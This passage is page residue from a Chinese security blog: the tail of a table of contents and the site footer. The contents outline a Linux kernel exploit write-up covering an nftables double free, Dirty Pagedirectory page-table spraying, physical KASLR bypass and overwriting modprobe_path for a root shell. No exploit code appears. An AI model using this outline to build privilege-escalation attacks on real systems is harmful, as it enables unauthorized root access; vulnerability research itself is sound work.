堆栈</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-1-%E4%BF%AE%E6%94%B9-skb-%E7%9A%84%E6%9C%80%E5%A4%A7%E5%AD%98%E6%B4%BB%E6%97%B6%E9%97%B4"><span class="nav-text">4.3.1 修改 skb 的最大存活时间</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-4-%E7%BB%95%E8%BF%87-KernelCTF-skb-%E6%8D%9F%E5%9D%8F%E6%A3%80%E6%9F%A5"><span class="nav-text">4.4 绕过 KernelCTF skb 损坏检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-5-%E8%84%8F%E9%A1%B5%E7%9B%AE%E5%BD%95%EF%BC%88Dirty-Pagedirectory%EF%BC%89"><span class="nav-text">4.5. 脏页目录（Dirty Pagedirectory）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-1-%E6%80%9D%E8%B7%AF"><span class="nav-text">4.5.1. 思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-2-%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82"><span class="nav-text">4.5.2. 技术细节</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-3-%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="nav-text">4.5.3. 缓解措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-6-%E4%B8%BA%E8%84%8F%E9%A1%B5%E7%9B%AE%E5%BD%95%E5%96%B7%E5%B0%84%E9%A1%B5%E8%A1%A8"><span class="nav-text">4.6. 为脏页目录喷射页表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-7-TLB-%E5%88%B7%E6%96%B0"><span class="nav-text">4.7. TLB 刷新</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-8-%E5%A4%84%E7%90%86%E7%89%A9%E7%90%86-KASLR"><span class="nav-text">4.8. 处理物理 KASLR</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-8-1-%E8%8E%B7%E5%8F%96%E7%89%A9%E7%90%86%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80"><span class="nav-text">4.8.1 获取物理内核基址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-8-2-%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80"><span class="nav-text">4.8.2 获取目标物理地址</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81"><span class="nav-text">5. 概念验证</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-%E6%89%A7%E8%A1%8C"><span class="nav-text">5.1 执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-1-%E8%AE%BE%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="nav-text">5.1.1 设置环境</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-1-1-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="nav-text">5.1.1.1 命名空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-1-2-Nftables"><span class="nav-text">5.1.1.2 Nftables</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-1-3-%E9%A2%84%E5%88%86%E9%85%8D"><span class="nav-text">5.1.1.3 预分配</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-2-%E6%89%A7%E8%A1%8C%E5%8F%8C%E9%87%8D%E9%87%8A%E6%94%BE"><span class="nav-text">5.1.2 执行双重释放</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-2-1-%E4%BF%9D%E7%95%99%E7%94%A8%E4%BA%8E%E6%8E%A9%E7%9B%96%E7%9A%84%E5%B9%B2%E5%87%80-skb"><span class="nav-text">5.1.2.1 保留用于掩盖的干净 skb</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-2-2-%E8%A7%A6%E5%8F%91%E5%8F%8C%E9%87%8D%E9%87%8A%E6%94%BE%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%87%8A%E6%94%BE"><span class="nav-text">5.1.2.2 触发双重释放的第一次释放</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-2-3-%E4%BD%BF%E7%94%A8-skb-%E6%8E%A9%E7%9B%96%E5%8F%8C%E9%87%8D%E9%87%8A%E6%94%BE"><span class="nav-text">5.1.2.3 使用 skb 掩盖双重释放</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-2-4-%E5%96%B7%E5%B0%84-PTE"><span class="nav-text">5.1.2.4 喷射 PTE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-2-5-%E8%A7%A6%E5%8F%91%E5%8F%8C%E9%87%8D%E9%87%8A%E6%94%BE%E7%9A%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE"><span class="nav-text">5.1.2.5 触发双重释放的第二次释放</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-2-6-%E5%88%86%E9%85%8D-PMD"><span class="nav-text">5.1.2.6 分配 PMD</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-2-7-%E6%9F%A5%E6%89%BE%E9%87%8D%E5%8F%A0%E7%9A%84-PTE"><span class="nav-text">5.1.2.7 查找重叠的 PTE</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-3-%E6%89%AB%E6%8F%8F%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98"><span class="nav-text">5.1.3 扫描物理内存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-3-1-%E6%9F%A5%E6%89%BE%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80"><span class="nav-text">5.1.3.1 查找内核基址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-3-2-%E6%9F%A5%E6%89%BE-modprobe-path"><span class="nav-text">5.1.3.2 查找 modprobe_path</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-4-%E8%A6%86%E7%9B%96-modprobe-path"><span class="nav-text">5.1.4 覆盖 modprobe_path</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-5-%E8%A7%A6%E5%8F%91-root-shell"><span class="nav-text">5.1.5 触发 root shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-6-%E5%90%8E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5%E7%9A%84%E7%A8%B3%E5%AE%9A%E6%80%A7"><span class="nav-text">5.1.6 后利用阶段的稳定性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-7-%E8%BF%90%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">5.1.7 运行漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-text">5.2 源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-3-%E7%BC%96%E8%AF%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">5.3 编译漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-1-%E4%BE%9D%E8%B5%96%E9%A1%B9"><span class="nav-text">5.3.1 依赖项</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-2-Makefile"><span class="nav-text">5.3.2 Makefile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-3-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E5%A4%87%E6%B3%A8%E4%B8%8E%E9%94%99%E8%AF%AF"><span class="nav-text">5.3.3 静态编译备注与错误</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-3-3-1-libmnl-%E6%89%BE%E4%B8%8D%E5%88%B0"><span class="nav-text">5.3.3.1 libmnl 找不到</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-3-3-2-%E6%97%A0%E6%95%88%E6%93%8D%E4%BD%9C%E7%A0%81-AVX-%E4%B9%90%E8%B6%A3"><span class="nav-text">5.3.3.2 无效操作码 - AVX 乐趣</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-%E8%AE%A8%E8%AE%BA"><span class="nav-text">6. 讨论</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6-1-%E5%8F%8C%E9%87%8D%E9%87%8A%E6%94%BE%E6%96%B9%E6%B3%95"><span class="nav-text">6.1 双重释放方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-2-%E5%90%8E%E6%9C%9F%E7%A8%B3%E5%AE%9A%E6%80%A7"><span class="nav-text">6.2 后期稳定性</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-%E5%BF%83%E6%80%81%E4%B8%8E%E7%AD%BE%E5%90%8D"><span class="nav-text">7. 心态与签名</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#7-1-VR-%E5%BF%83%E6%80%81"><span class="nav-text">7.1 VR 心态</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-2-%E5%8F%8D%E6%80%9D"><span class="nav-text">7.2 反思</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-3-%E8%87%B4%E8%B0%A2"><span class="nav-text">7.3 致谢</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-4-%E7%AD%BE%E5%90%8D"><span class="nav-text">7.4 签名</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        30 posts in total
                    </span>
                    
                        <span>
                            485.1k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>